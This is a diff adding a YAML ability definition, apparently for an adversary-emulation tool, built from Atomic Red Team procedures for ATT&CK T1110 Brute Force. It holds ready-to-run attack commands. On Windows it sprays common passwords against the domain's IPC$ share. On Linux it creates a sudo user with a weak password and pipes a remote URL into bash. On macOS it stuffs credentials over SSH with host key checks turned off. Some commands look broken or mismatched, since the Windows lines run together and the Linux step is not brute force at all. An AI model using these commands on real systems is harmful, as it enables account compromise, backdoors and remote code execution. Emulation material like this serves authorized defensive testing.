@@ -1,0 +1,26 @@
+- id: f82df574-c9f4-4e19-8d1a-311ad92883fd
+  name: Brute Force
+  description: Ability for Brute Force (ATT&CK T1110). Generated from Atomic Red Team
+    procedures; review and test safely before use.
+  tactic: credential-access
+  technique:
+    attack_id: T1110
+    name: Brute Force
+  platforms:
+    windows:
+      psh:
+        command: 'echo Password1> passwords.txt echo 1q2w3e4r>> passwords.txt echo
+          Password!>> passwords.txt echo Spring2022>> passwords.txt echo ChangeMe!>>
+          passwords.txt @FOR /F "delims=" %p in (passwords.txt) DO @net use %logonserver%\IPC$
+          /user:"%userdomain%\#{user}" "%p" 1>NUL 2>&1 && @echo [*] #{user}:%p &&
+          @net use /delete %logonserver%\IPC$ > NUL'
+    linux:
+      sh:
+        command: 'useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123)
+          art su -c "cd /tmp; curl -s #{remote_url} | bash" art'
+    darwin:
+      sh:
+        command: cp "$#{atomics_dir}/T1110.004/src/credstuffuserpass.txt" /tmp/ for
+          unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass
+          | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut
+          -d":" -f1`@#{target_host};done
